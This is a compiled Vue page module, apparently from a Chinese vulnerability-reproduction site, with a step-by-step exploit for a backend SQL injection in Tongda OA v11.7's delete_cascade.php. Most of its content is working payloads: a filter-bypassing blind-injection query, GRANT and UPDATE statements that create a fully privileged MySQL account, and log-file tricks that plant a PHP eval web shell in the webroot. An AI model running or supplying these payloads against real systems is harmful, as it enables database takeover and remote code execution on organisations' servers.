import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as s,d as p,e as t}from"./app-58e4a7d6.js";const l={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"通达OA v11.7后台存在SQL注入，可通过此漏洞写入恶意后门文件攻击目标服务器",-1),k=n("p",null,"参考阅读：",-1),d={href:"https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw",target:"_blank",rel:"noopener noreferrer"},g=t(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>通达OA v11.7
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2>`,3),_={href:"https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe",target:"_blank",rel:"noopener noreferrer"},b=t(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>在 <strong>general/hr/manage/query/delete_cascade.php</strong> 文件中</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091108270.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>首先判断<code>$condition_cascade</code>是否为空，如果不为空，则将其中的<code>\\&#39;</code>替换为<code>&#39;</code>。为什么要这样替换呢，主要是因为V11.7版本中，注册变量时考虑了安全问题，将用户输入的字符用<code>addslashes</code>函数进行保护，如下：</p><p><strong>inc/common.inc.php</strong> 代码</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091108141.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>使用盲注对SQL注入进行测试</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091109818.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>触发了通达OA的SQL注入拦截</p><p><strong>inc/conn.php</strong>文件中找到过滤机制如下:</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091109512.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>其过滤了一些字符，但是并非无法绕过，盲注的核心是：<code>substr、if</code>等函数，均未被过滤，那么只要构造MySQL报错即可配合<code>if</code>函数进行盲注了，翻看局外人师傅在补天白帽大会上的分享，发现<code>power(9999,99)</code>也可以使数据库报错，所以构造语句：</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">&#39;r&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>power<span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 当字符相等时，不报错，错误时报错</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091110796.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091110677.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>添加SQL数据库用户</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">grant</span> <span class="token keyword">all</span> <span class="token keyword">privileges</span> <span class="token keyword">ON</span> mysql<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">&#39;peiqi&#39;</span><span class="token variable">@&#39;%&#39;</span> IDENTIFIED <span class="token keyword">BY</span> <span class="token string">&#39;peiqiABC@123&#39;</span> <span class="token keyword">WITH</span> <span class="token keyword">GRANT</span> <span class="token keyword">OPTION</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,17),f={href:"http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant",target:"_blank",rel:"noopener noreferrer"},m=n("em",null,"TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION",-1),v=t('<p>进入 <strong>Myoa/mysql5/bin</strong> 目录 执行 <strong>mysql -upeiqi -p</strong> 输入密码查询所有用户</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091110154.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发现成功执行添加一个账户</p><p>然后该用户是对mysql数据库拥有所有权限的,然后给自己加权限：</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">UPDATE</span> <span class="token identifier"><span class="token punctuation">`</span>mysql<span class="token punctuation">`</span></span><span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>user<span class="token punctuation">`</span></span> <span class="token keyword">SET</span> <span class="token identifier"><span class="token punctuation">`</span>Password<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;*FBCFBB73CF21D4F464A95E775B40AF27A679CD2D&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Select_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Insert_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Update_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Delete_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Create_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Drop_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Reload_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Shutdown_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Process_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>File_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Grant_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>References_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Index_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Alter_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Show_db_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Super_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Create_tmp_table_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Lock_tables_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Execute_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Repl_slave_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Repl_client_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Create_view_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Show_view_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Create_routine_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Alter_routine_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Create_user_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Event_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Trigger_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>Create_tablespace_priv<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>ssl_type<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>ssl_cipher<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>x509_issuer<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>x509_subject<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>max_questions<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>max_updates<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>max_connections<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>max_user_connections<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>plugin<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;mysql_native_password&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>authentication_string<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">,</span> <span class="token identifier"><span class="token punctuation">`</span>password_expired<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">&#39;Y&#39;</span> <span class="token keyword">WHERE</span> <span class="token identifier"><span class="token punctuation">`</span>Host<span class="token punctuation">`</span></span> <span class="token operator">=</span> Cast<span class="token punctuation">(</span><span class="token string">&#39;%&#39;</span> <span class="token keyword">AS</span> <span class="token keyword">Binary</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token identifier"><span class="token punctuation">`</span>User<span class="token punctuation">`</span></span> <span class="token operator">=</span> Cast<span class="token punctuation">(</span><span class="token string">&#39;peiqi&#39;</span> <span class="token keyword">AS</span> <span class="token keyword">Binary</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091111720.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后用注入点刷新权限，因为该用户是没有刷新权限的权限的：<code>general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;</code>这样就拥有了所有权限</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091111343.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>登录如果失败，执行</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">grant</span> <span class="token keyword">all</span> <span class="token keyword">privileges</span> <span class="token keyword">ON</span> mysql<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">&#39;peiqi&#39;</span><span class="token variable">@&#39;%&#39;</span> IDENTIFIED <span class="token keyword">BY</span> <span class="token string">&#39;peiqiABC@123&#39;</span> <span class="token keyword">WITH</span> <span class="token keyword">GRANT</span> <span class="token keyword">OPTION</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>利用漏洞写shell</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment"># 查路径：</span>\n<span class="token keyword">select</span> @<span class="token variable">@basedir</span><span class="token punctuation">;</span> <span class="token comment"># F:\\OA\\mysql5\\，那么web目录就是 F:/OA/webroot/</span>\n<span class="token comment"># 方法1：</span>\n<span class="token keyword">set</span> <span class="token keyword">global</span> slow_query_log<span class="token operator">=</span><span class="token keyword">on</span><span class="token punctuation">;</span>\n<span class="token keyword">set</span> <span class="token keyword">global</span> slow_query_log_file<span class="token operator">=</span><span class="token string">&#39;F:/OA/webroot/&#39;</span><span class="token punctuation">;</span>\n<span class="token keyword">select</span> <span class="token string">&#39;&lt;?php eval($_POST[x]);?&gt;&#39;</span> <span class="token operator">or</span> sleep<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token comment"># 方法2：</span>\n<span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token keyword">on</span><span class="token punctuation">;</span>\n<span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file <span class="token operator">=</span> <span class="token string">&#39;F:/OA/webroot/&#39;</span><span class="token punctuation">;</span>\n<span class="token keyword">select</span> <span class="token string">&#39;&lt;?php eval($_POST[x]);?&gt;&#39;</span><span class="token punctuation">;</span>\n<span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">&#39;%general%&#39;</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上传大马</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091111491.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>',14);function h(y,w){const a=o("ExternalLinkIcon");return c(),i("div",null,[r,u,k,n("ul",null,[n("li",null,[s("[通达OA v11.7后台SQL注入到RCE"),n("a",d,[s("0day]"),p(a)])])]),g,n("p",null,[n("a",_,[s("环境地址"),p(a)])]),b,n("p",null,[s("访问 **"),n("a",f,[s("http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant"),p(a)]),s(" all privileges ON mysql. "),m]),v])}const Y=e(l,[["render",h],["__file","通达OA v11.7 delete_cascade.php 后台SQL注入.html.vue"]]);export{Y as default};
